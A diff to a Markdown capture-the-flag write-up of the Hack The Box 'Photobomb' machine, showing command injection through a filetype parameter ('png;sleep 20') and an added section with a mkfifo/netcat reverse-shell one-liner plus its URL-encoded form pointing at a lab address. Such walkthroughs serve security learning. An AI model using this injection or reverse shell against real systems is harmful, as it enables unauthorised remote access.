@@ -58,10 +58,27 @@ So lets try another parameter, we can use the same technique to view the regex b
 ```
  if !filetype.match(/^(png|jpg)/)
 ```
-again, im not the best with regex. but this regex allows any character, well lets try and breakout using this parameter, i'll put a semicolon and a sleep command and see what happens
+again, im not the best with regex. but this regex allows any character as long as it has png or jpg in it, well lets try and breakout using this parameter, i'll put a semicolon and a sleep command and see what happens
 ```
 photo=.&filetype=png;sleep 20&dimensions=0x0
 ```
 and what do you know, that page took ages to load.. about 20 seconds!
 ![Picture of loading page](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/waiting20.png)
 ### Command Injection
+Well first things first, we seem to have command injection, can we reverse shell at this stage?
+There are many different ways to reverse shell, the one that always seems to work for me is below:
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $IP $PORT >/tmp/f
+```
+lets url encode that, setup a netcat listener and see if we get a connection!
+![Picture of nc](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/nc-startup.png)
+encoded comes out to
+```
+%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%35%31%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66
+```
+![Picture of exploit 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/owned_page.png)
+![Picture of exploit 2](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/owned_shell.png)
+SHELL ACCESS!
+We are in command of the user "wizard", lets check this home directory out!
+![Picture of user home folder](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/user_folder.png)
+And here we find the user.txt flag, I'll let you grab that yourself if you're reading this :)
